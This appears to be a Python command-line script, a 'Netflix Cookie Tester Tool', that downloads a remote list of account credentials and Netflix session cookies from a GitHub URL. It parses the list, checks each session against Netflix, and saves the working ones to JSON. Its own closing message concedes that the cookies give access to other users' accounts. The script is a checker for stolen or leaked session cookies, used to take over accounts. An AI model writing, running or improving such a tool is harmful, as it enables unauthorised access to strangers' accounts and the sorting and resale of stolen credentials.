import argparse
import sys
import json
import os

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from cookie_tester import fetch_data, parse_netflix_cookies, create_cookie_jar, verify_cookies

def main():
    parser = argparse.ArgumentParser(description="Netflix Cookie Tester Tool")
    parser.add_argument("--source", default="https://github.com/Illhm/cookies-/raw/refs/heads/main/p.txt", help="URL or file path to cookie data")
    parser.add_argument("--verify", action="store_true", help="Verify cookies by connecting to Netflix")
    parser.add_argument("--output", help="Output file for valid cookies (JSON format)")

    args = parser.parse_args()

    print(f"Fetching data from {args.source}...")
    data = fetch_data(args.source)

    if not data:
        print("Failed to fetch data.")
        sys.exit(1)

    print("Parsing cookies...")
    accounts = parse_netflix_cookies(data)
    print(f"Found {len(accounts)} potential accounts.")

    results = []

    for account in accounts:
        result = {
            "credentials": account.get("credentials"),
            "cookies": {
                "NetflixId": account.get("NetflixId"),
                "SecureNetflixId": account.get("SecureNetflixId")
            },
            "status": "unknown"
        }

        if args.verify:
            print(f"Verifying {account.get('credentials')}...")
            jar = create_cookie_jar(account)
            is_valid = verify_cookies(jar)
            result["status"] = "valid" if is_valid else "invalid"
            print(f"  -> {result['status']}")

        results.append(result)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"Results written to {args.output}")
    else:
        # Print to stdout
        print(json.dumps(results, indent=2))

    print("\n[!] Privacy Note: These cookies provide access to user accounts. Handle with care and do not share logs containing valid cookies.")

if __name__ == "__main__":
    main()
